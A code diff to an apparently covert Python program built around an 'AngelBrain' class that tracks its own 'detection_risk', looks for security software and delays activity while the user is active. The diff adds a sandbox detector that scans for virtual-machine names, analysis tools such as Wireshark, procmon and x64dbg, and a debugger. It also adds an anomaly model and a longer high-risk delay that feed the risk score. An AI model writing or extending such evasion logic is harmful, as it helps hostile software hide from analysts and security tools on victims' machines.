@@ -3,8 +3,113 @@ import time
 import random
 import threading
 import json
-from typing import Dict, List, Optional
+import numpy as np
+from typing import Dict, List, Optional, Tuple
 from datetime import datetime
+from sklearn.ensemble import IsolationForest
+from sklearn.preprocessing import StandardScaler
+
+class BehaviorAnalyzer:
+    def __init__(self):
+        self.scaler = StandardScaler()
+        self.model = IsolationForest(contamination=0.1, random_state=42)
+        self.behavior_history = []
+        
+    def analyze(self, metrics: Dict) -> Tuple[float, bool]:
+        """Analyze behavior and detect anomalies"""
+        features = self._extract_features(metrics)
+        self.behavior_history.append(features)
+        
+        # Keep last 1000 samples
+        if len(self.behavior_history) > 1000:
+            self.behavior_history.pop(0)
+            
+        # Train model when we have enough data
+        if len(self.behavior_history) >= 100:
+            X = np.array(self.behavior_history)
+            X_scaled = self.scaler.fit_transform(X)
+            self.model.fit(X_scaled)
+            
+            # Get anomaly score
+            current_scaled = self.scaler.transform([features])
+            score = self.model.score_samples(current_scaled)[0]
+            is_anomaly = score < -0.5
+            
+            return score, is_anomaly
+            
+        return 0.0, False
+        
+    def _extract_features(self, metrics: Dict) -> List[float]:
+        """Extract behavioral features from metrics"""
+        return [
+            metrics.get('cpu_usage', 0),
+            metrics.get('memory_usage', 0),
+            metrics.get('disk_usage', 0),
+            metrics.get('network_bytes_sent', 0) / 1024,  # KB
+            metrics.get('network_bytes_recv', 0) / 1024,  # KB
+            len(metrics.get('processes', [])),
+            sum(p.get('cpu', 0) for p in metrics.get('processes', [])),
+            sum(p.get('memory', 0) for p in metrics.get('processes', [])),
+            1 if metrics.get('user_active', False) else 0
+        ]
+
+class SandboxDetector:
+    def __init__(self):
+        self.vm_indicators = [
+            'VirtualBox',
+            'VMware',
+            'QEMU',
+            'Xen',
+            'Parallels',
+            'Virtual',
+            'VBOX',
+            'VMWARE'
+        ]
+        self.sandbox_processes = [
+            'wireshark',
+            'procmon',
+            'procexp',
+            'ida',
+            'x64dbg',
+            'ollydbg',
+            'pestudio',
+            'processhacker'
+        ]
+        
+    def check_environment(self) -> Dict[str, bool]:
+        """Check for signs of sandbox/VM environment"""
+        import psutil
+        
+        results = {
+            'is_vm': False,
+            'is_monitored': False,
+            'has_debugger': False
+        }
+        
+        # Check running processes
+        for proc in psutil.process_iter(['name']):
+            try:
+                name = proc.info['name'].lower()
+                # Check for VM
+                for indicator in self.vm_indicators:
+                    if indicator.lower() in name:
+                        results['is_vm'] = True
+                        
+                # Check for monitoring tools
+                for tool in self.sandbox_processes:
+                    if tool in name:
+                        results['is_monitored'] = True
+            except:
+                continue
+                
+        # Check for debugger
+        try:
+            import ctypes
+            results['has_debugger'] = ctypes.windll.kernel32.IsDebuggerPresent() != 0
+        except:
+            pass
+            
+        return results
 
 class AngelBrain:
     def __init__(self):
@@ -14,9 +119,13 @@ class AngelBrain:
             'user_activity': 0,
             'system_load': 0,
             'detection_risk': 0,
-            'last_analysis': 0
+            'last_analysis': 0,
+            'behavior_score': 0.0,
+            'is_anomaly': False
         }
         self.rules = self._load_default_rules()
+        self.behavior_analyzer = BehaviorAnalyzer()
+        self.sandbox_detector = SandboxDetector()
         self.learning_data = []
         self.active = True
         
@@ -38,13 +147,15 @@ class AngelBrain:
             'timing_rules': {
                 'min_delay': 1,
                 'max_delay': 300,
-                'user_active_delay': 60
+                'user_active_delay': 60,
+                'high_risk_delay': 600
             },
             'activity_weights': {
-                'cpu_usage': 0.3,
+                'cpu_usage': 0.2,
                 'memory_usage': 0.2,
                 'disk_activity': 0.2,
-                'network_activity': 0.3
+                'network_activity': 0.2,
+                'behavior_score': 0.2
             }
         }
         
@@ -78,8 +189,8 @@ class AngelBrain:
             # Security software detection
             security_software = self._detect_security_software()
             
-            # Update environment state
-            self.state['environment'] = {
+            # Environment data
+            env_data = {
                 'timestamp': time.time(),
                 'cpu_usage': cpu_percent,
                 'memory_usage': memory.percent,
@@ -90,6 +201,19 @@ class AngelBrain:
                 'user_active': user_active,
                 'security_software': security_software
             }
+            
+            # Analyze behavior
+            behavior_score, is_anomaly = self.behavior_analyzer.analyze(env_data)
+            env_data['behavior_score'] = behavior_score
+            env_data['is_anomaly'] = is_anomaly
+            
+            # Check for sandbox/VM
+            env_data['sandbox_check'] = self.sandbox_detector.check_environment()
+            
+            # Update state
+            self.state['environment'] = env_data
+            self.state['behavior_score'] = behavior_score
+            self.state['is_anomaly'] = is_anomaly
             
             # Calculate risk metrics
             self._calculate_risk_metrics()
@@ -138,7 +262,10 @@ class AngelBrain:
         # Base risk from system metrics
         system_risk = (
             env['cpu_usage'] * self.rules['activity_weights']['cpu_usage'] +
-            env['memory_usage'] * self.rules['activity_weights']['memory_usage']
+            env['memory_usage'] * self.rules['activity_weights']['memory_usage'] +
+            env['disk_usage'] * self.rules['activity_weights']['disk_activity'] +
+            env['network_bytes_sent'] * self.rules['activity_weights']['network_activity'] +
+            env['behavior_score'] * self.rules['activity_weights']['behavior_score']
         ) / 100.0
         
         # Risk from security software
